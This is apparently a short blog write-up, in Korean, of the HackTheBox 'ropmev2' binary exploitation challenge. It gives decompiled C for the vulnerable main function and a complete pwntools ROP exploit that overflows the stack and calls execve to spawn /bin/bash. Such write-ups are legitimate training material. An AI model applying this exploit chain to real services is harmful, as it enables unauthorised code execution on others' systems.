---
title: "[HackTheBox]ropmev2"
date: 2020-1-14
tags: [hackthebox.eu]
categories: [hackthebox.eu]
---

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char **v3; // rdx
  char *buf[26]; // [rsp+0h] [rbp-D0h]

  sub_401213();
  printf("Please dont hack me\n", buf);
  read(0, buf, 500uLL);
  if ( !strcmp("DEBUG\n", buf) )
  {
    printf("I dont know what this is %p\n", buf);
    main("I dont know what this is %p\n", buf, v3);
  }
  sub_401238(buf);
  return 0LL;
}
```

buf주소도 주는데 별로 쓸 필요없다. 다른 익스 방법이 있는건지 모르겠다.

buf에 `\x00` 으로 문자열 끝이라고 인식하게 한 다음에 `sub_401238` 함수 우회해주면 된다.

저기서 서버에서 사용하는 쉘이 /bin/sh 쉘이 아니라서 좀 애먹었다. 서버에서는 /bin/bash로 쉘 따야 권한 얻을 수 있다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./ropmev2')
p = process('./ropmev2')
#libc = e.libc
prdi = 0x000000000040142b #pop rdi ; ret
prsi_r15 = 0x0000000000401429 # pop rsi ; pop r15 ; ret
prdx_r13 = 0x0000000000401164 # pop rdx ; pop r13 ; ret
prax = 0x0000000000401162 # pop rax ; ret
main = 0x000000000040116B

payload = '\x00' * 0xd0 + 'realsung'
payload += p64(prdi) + p64(0) + p64(prsi_r15) + p64(e.bss() + 0x100) + p64(0) + p64(prdx_r13) + p64(15) + p64(0) + p64(e.plt['read'])
payload += p64(prax) + p64(59) + p64(prdi) + p64(e.bss() + 0x100) + p64(prsi_r15) + p64(0) + p64(0) + p64(prdx_r13) + p64(0) + p64(0) + p64(0x0000000000401168)
p.sendlineafter('me\n',payload)

p.sendline('/bin/bash\x00')

p.interactive()
```

